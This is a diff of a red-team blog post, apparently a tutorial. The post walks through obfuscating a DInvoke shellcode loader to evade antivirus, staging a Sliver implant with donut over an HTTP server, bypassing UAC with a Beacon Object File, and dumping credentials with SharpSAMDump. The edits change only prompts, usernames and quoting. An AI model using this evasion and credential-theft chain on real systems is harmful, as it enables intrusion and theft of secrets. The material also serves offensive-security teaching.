@@ -24,7 +24,7 @@ In order to make use of DInvoke as a shellcode loader, I modified an existing C#
 With these changes applied, we can save the project and perform some obfuscation. The [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) project serves as an obfuscation toolkit that allows for some quick modifications to your project like changing the name, project GUID, string obfuscation, removing comments and removing program database (PDB) strings. Download the project, compile the binary and run the following command in order to rename the project and apply string reversing as the obfuscation method.
 
 ```console
-C:\Tools\Python\InvisibilityCloak> python InvisibilityCloak.py -d "C:\Tools\DInvoke_Loader\DInvoke_shellcodeload" -n "Bashee" -m reverse
+C:\Tools\Python\InvisibilityCloak> python.exe InvisibilityCloak.py -d C:\Tools\DInvoke_Loader\DInvoke_shellcodeload -n "Bashee" -m reverse
 ,                 .     .   .        ,-. .         ,
 |         o     o |   o | o |       /    |         |
 | ;-. . , . ,-. . |-. . | . |-  . . |    | ,-. ,-: | ,
@@ -81,7 +81,7 @@ Analyzing...
 
 Exhausted the search. The binary looks good to go!
 
-C:\Tools\ThreatCheck\bin\Release>.\ThreatCheck.exe -f "C:\Tools\BasheeLoader.exe"
+C:\Tools\ThreatCheck\bin\Release> ThreatCheck.exe -f C:\Tools\BasheeLoader.exe
 [+] No threat found!
 ```
 
@@ -115,8 +115,8 @@ $ ./donut -b 1 -e 3 -o rev.bin -i /tmp/ESSENTIAL_THEATER.exe
 Lets copy all files to the `/tmp` directory and run our Python HTTP server.
 
 ```console
-bashee@OMEN:~/Tools/donut$ cp rev.bin /tmp/rev.bin
-bashee@OMEN:/tmp$ python3 -m http.server 8080
+$ cp rev.bin /tmp/rev.bin
+$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 ```
 
@@ -176,8 +176,8 @@ SeTimeZonePrivilege           Change the time zone                              
 We see our user is part of the `Administrators` group but we are not in a high integrity process. This means that we have to bypass UAC (User Access Control) to get a shell with full Administrator privileges. There is an excellent project called [UAC-BOF-Bonanza](https://github.com/icyguider/UAC-BOF-Bonanza) that includes Beacon Object Files that can be loaded to Sliver in order to bypass UAC. After cloning the repository, we can load them into Sliver as follows (e.g. `CmstpElevatedCOM`):
 
 ```console
-bashee@OMEN:~/Tools/Custom/Sliver$ git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
-bashee@OMEN:~/Tools/Custom/Sliver$ cp UAC-BOF-Bonanza/CmstpElevatedCOM/ /home/bashee/.sliver-client/extensions/
+$ git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
+$ cp UAC-BOF-Bonanza/CmstpElevatedCOM/ /home/s3rp3nt/.sliver-client/extensions/
 ```
 
 The above UAC Bypass creates an elevated `ICMLuaUtil COM` object and calls its ShellExec function to execute the provided file on disk. If it is the first time using these custom extension, restart yuor Sliver server. We can now run the `CmstpElevatedCom` task from within our beacon that executes our loader.
@@ -187,7 +187,7 @@ The above UAC Bypass creates an elevated `ICMLuaUtil COM` object and calls its S
 This will launch another beacon process running as Administrator. With these privileges we can try to dump all credentials from LSASS. To stay stealthy, let's use [SharpSAMDump](https://github.com/jojonas/SharpSAMDump).
 
 ```console
-[server] sliver (ESSENTIAL_THEATER) > execute-assembly -i /home/bashee/Tools/Windows/SharpSAMDump.exe
+[server] sliver (ESSENTIAL_THEATER) > execute-assembly -i /home/s3rp3nt/Tools/Windows/SharpSAMDump.exe
 
 [*] Tasked beacon ESSENTIAL_THEATER (c4af87ff)
 
